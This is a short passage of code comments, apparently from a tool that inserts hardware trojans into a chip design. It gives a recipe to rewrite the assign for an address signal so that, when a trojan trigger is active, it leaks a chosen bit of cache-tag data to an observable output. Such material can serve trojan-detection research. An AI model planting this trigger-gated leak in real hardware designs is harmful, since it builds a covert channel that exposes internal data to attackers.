 ...
 * Payload: Route addr_i[0] to observable output
 * 
...
//   Find the assign for addr_i (or rd_error_o as fallback):
//     assign addr_i = <normal_expr>;
//   Replace with:
//     assign addr_i = trojan_active ? ic_tag_write_o[leak_bit_idx] : (<normal_expr>);
//
